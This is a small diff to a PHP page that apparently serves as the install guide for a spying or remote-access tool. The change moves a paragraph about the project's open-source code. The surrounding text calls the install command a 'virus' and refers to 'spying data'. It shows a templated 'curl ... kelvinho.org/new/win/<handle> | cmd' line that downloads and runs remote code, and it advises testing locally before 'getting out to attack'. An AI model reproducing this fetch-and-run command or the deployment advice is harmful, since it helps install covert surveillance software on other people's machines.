@@ -157,9 +157,6 @@ And run this for Mac (in development):
 <p>The "-L" option is to go through all the redirects your web server guides and to fetch the final destination. If
     you're lazy and just don't agree that I should have the word virus inside of the install command, you can use
     any of these commands instead:</p>
-<p>Or... You don't agree that I control your spying data so you can rebuild everything. The project is open sourced
-    (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The installation details are
-    way too technical here, but there're plenty of guide on the github page.</p>
 <div style="overflow: auto;">
     <?php foreach ($alternates as $alternate) { ?>
         <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/win/<?php echo $user_handle; ?> | cmd</pre>
@@ -171,6 +168,9 @@ And run this for Mac (in development):
     a valid certificate because I'm lazy to get one, and the main site already has a valid certificate, so why
     bother? So if you were to do the curl thing, option "-k" will accept encrypted requests with an invalid
     certificate.</p>
+<p>Or... You don't agree that I control your spying data so you can rebuild everything. The project is open sourced
+    (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The
+    installation details are way too technical here, but there're plenty of guide on the github page.</p>
 <p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
     to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
     installed properly do you?</p>
